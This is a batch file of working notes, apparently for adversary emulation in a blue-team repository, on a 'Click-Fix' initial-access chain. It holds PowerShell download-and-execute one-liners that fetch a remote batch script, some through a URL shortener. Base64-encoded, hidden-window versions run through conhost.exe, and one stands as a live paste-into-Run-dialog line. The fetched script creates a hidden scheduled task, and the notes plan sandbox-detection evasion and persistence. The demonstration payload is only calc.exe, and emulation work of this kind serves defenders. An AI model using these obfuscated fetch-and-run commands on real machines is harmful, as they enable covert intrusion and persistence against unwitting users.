:: Initial Access : Click-Fix
::    Concept:
::      - Click-Fix creates Scheduled Task to execute stager
::      - Stager grabs secondary payload to check for VM and then start persistence

:: Iteration 1:
:: 		powershell.exe -c "iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/taskScheduler.bat' -UseBasicParsing).Content"
::		powershell.exe -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ATABlAE0AYQBnAGkAYwBLAG8AbgBjAGgALwBCAEwAdQBlAFQAZQBhAG0ATwBwAHMALwByAGEAdwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AQQBkAHYAZQByAHMAYQByAHkAIABFAG0AdQBsAGEAdABpAG8AbgAvAHQAYQBzAGsAUwBjAGgAZQBkAHUAbABhAHIALgBiAGEAdAAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA=

:: Iteration 2:
::		Needed to use a URL shortener to fit the command in the run dialog box. I used "tinyurl"
::			Original URL --> https://raw.githubusercontent.com/LeMagicKonch/BlueTeamOps/f755083e31c8b803c331f94d906535a8593ba3e4/Adversary%20Emulation/taskSchedular.bat
::			Compressed URL --> https://tinyurl.com/mvyej24r
::		Command:
:: 			powershell.exe -c "iex (iwr -uri https://tinyurl.com/mvyej24r -UseBasicParsing).Content"
::		Encoded Command:
::			conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"

:: Content of bat file being executed
::      schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater /F"
::      timeout /t 240
::       schtasks /DELETE /TN updater /F


conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"


:: Initial Access : Check for VM | Sandbox
::    Concept:
::      - Download and execute second script in memory
::      - Check for VM or Sandbox
::          - VM | Sandbox Detected
::              - Do nothing
::          - No VM | Sandbox Detected
::              - Create second stager as Scheduled Task


:: Initial Access : Second Stager Scheduled Task
::    Concept:
::       - 

